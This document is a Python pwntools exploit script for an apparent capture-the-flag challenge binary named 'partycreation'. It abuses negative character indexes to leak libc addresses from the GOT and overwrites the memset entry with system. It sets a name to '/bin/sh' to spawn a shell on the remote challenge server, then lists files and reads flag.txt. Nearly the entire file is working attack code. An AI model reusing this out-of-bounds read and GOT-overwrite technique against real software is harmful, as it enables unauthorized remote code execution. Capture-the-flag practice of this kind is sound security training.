#!/usr/bin/env python3

from pwn import *

"""
Show character at index I: x/24c (char *)&party+0x18*I
Show values only at index I: x/8c (char *)&party+0x10+0x18*I
Leaking values is fine, but I can only rename, not revalue.
I can write nulls in name; it just has to end with a null byte.
"""

def menuChoice(n):
    print(conn.recvuntil('(4) Begin Hacking\n> ').decode())
    conn.sendline(str(n).encode())

def createCharacter(name):
    assert len(name) <= 15
    menuChoice(1)
    print(conn.recvuntil(b'Enter your character\'s name:\n>').decode())
    conn.sendline(name)
    print(conn.recvuntil(b'joined your party!\n').decode())

def viewCharacter(index):
    menuChoice(2)
    print(conn.recvuntil(b'Which character do you wish to view (0-5)? \n>').decode())
    conn.sendline(str(index).encode())
    sep = b'-----------------------------\n'
    print((conn.recvuntil(sep)+conn.recvuntil(sep)).decode())
    name = conn.recvuntil('Strength:')[14:-10]
    print("Name:         ",name)
    values = []
    for x in ["Strength","Dexterity","Constitution","Intelligence","Wisdom","Charisma","Hit points"]:
        v = int(conn.recvline().split()[-1])
        if x=="Hit points":
            vb = p16(v,sign="signed")
        else:
            vb = p8(v,sign="signed")
        values.append(vb)
        print((x+':').ljust(14,' '), str(v).ljust(6,' '), vb)
    print(conn.recvuntil(sep).decode())
    print(name, b''.join(values))
    return name, b''.join(values)

def renameCharacter(index, name):
    assert len(name) <= 15
    menuChoice(3)
    print(conn.recvuntil(b'wish to rename (0-5)? \n>').decode())
    conn.sendline(str(index).encode())
    print(conn.recvuntil(b'name:\n>').decode())
    conn.sendline(name)
    print(conn.recvuntil(b'Rename complete.\n').decode())

###
context.arch = 'amd64'
libc = ELF('./libc-2.27.so')

elf = ELF("./partycreation")
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['puts']])
rop.call(elf.symbols['runMenu'])
ropchain = rop.chain()
print(len(ropchain), ropchain)
###

if args.GDB: #this uses local libc by default
    conn = gdb.debug('./partycreation', gdbscript=(''
            +'break runMenu\n'
            +'c\n'
           )
           )
else:
    conn = remote('pwn.red.csaw.io', 5010)

createCharacter(b'freddy')
viewCharacter(0)
renameCharacter(0,b'/bin/sh')
viewCharacter(0)

###LEAK###
_, printf_packed = viewCharacter(-7)
printf = u64(printf_packed)
print("printf:",hex(printf))
libc.address = printf - libc.symbols['printf']
print('libc address from printf:',hex(libc.address))

_, getchar_packed = viewCharacter(-6)
getchar = u64(getchar_packed)
print("getchar:",hex(getchar))
if getchar == libc.symbols['getchar']:
    print('libc base working as expected')
else:
    print('libc base disagreement')

###OVERWRITE###
print('system address:',hex(libc.symbols['system']))

system_packed = p64(libc.symbols['system'])[:-1]#the last null will be written for us
print(system_packed)
renameCharacter(-6, system_packed)#overwrite memset with system

###WIN###
menuChoice(3)#call overwritten memset (remote)
print(conn.recv())
conn.sendline('0')#use /bin/sh string in name
print(conn.recv())

print('ls')
conn.sendline(b'ls')

print(conn.recv().decode('ascii'))

conn.sendline(b'cat flag.txt')

print(conn.recv().decode('ascii'))

conn.close()
